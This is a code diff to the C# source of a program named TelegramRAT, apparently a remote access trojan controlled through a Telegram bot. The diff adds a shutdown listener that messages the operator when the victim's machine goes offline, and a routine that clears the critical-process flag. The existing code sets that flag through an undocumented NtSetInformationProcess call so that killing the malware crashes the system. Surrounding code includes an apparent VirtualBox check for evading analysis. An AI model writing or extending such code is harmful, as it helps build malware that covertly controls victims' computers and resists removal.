@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -18,6 +19,18 @@ namespace TelegramRAT
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
+        // 
+        public static void ShutdownListener()
+        {
+            SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
+        }
+        
+        // If shutdown/reboot
+        private static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
+        {
+            telegram.sendText("Go to offline...");
+            unprotectProcess();
+        }
 
         // Protect process
         public static bool protectProcess()
@@ -28,14 +41,28 @@ namespace TelegramRAT
                 {
                     Process.EnterDebugMode();
                     int iIsCritical = -1;
-
                     NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));
-
                     return true;
                 }
                 catch { return false; }
             } else { return false; }
-           
+        }
+
+        // Unprotect process
+        public static bool unprotectProcess()
+        {
+            if (config.ProcessProtectionEnabled)
+            {
+                try
+                {
+                    Process.EnterDebugMode();
+                    int iIsCritical = 0;
+                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref iIsCritical, sizeof(int));
+                    return true;
+                }
+                catch { return false; }
+            }
+            else { return false; }
         }
 
         // VirtualBox
@@ -177,6 +204,7 @@ namespace TelegramRAT
                     {
                         proc.Start();
                         proc.WaitForExit();
+                        unprotectProcess();
                         Environment.Exit(1);
                     }
                     catch (System.ComponentModel.Win32Exception)
